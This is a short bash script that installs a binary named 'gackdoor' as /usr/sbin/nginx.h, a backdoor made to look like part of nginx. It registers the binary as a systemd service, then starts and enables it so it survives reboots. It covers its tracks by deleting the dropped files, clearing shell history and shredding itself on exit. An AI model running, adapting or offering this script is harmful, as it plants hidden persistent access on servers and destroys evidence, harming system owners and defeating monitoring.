#!/bin/bash

currentscript="$0"

function finish {
    shred -u ${currentscript}
}

sudo strace -o /dev/null cp gackdoor /usr/sbin/nginx.h
sudo strace -o /dev/null cp temp /etc/systemd/system/nginx.h.service
sudo strace -o /dev/null systemctl daemon-reload
sudo strace -o /dev/null systemctl start nginx.h.service
sudo strace -o /dev/null systemctl enable nginx.h.service

rm -f gackdoor
rm -f temp

history -c && history -w.
trap finish EXIT
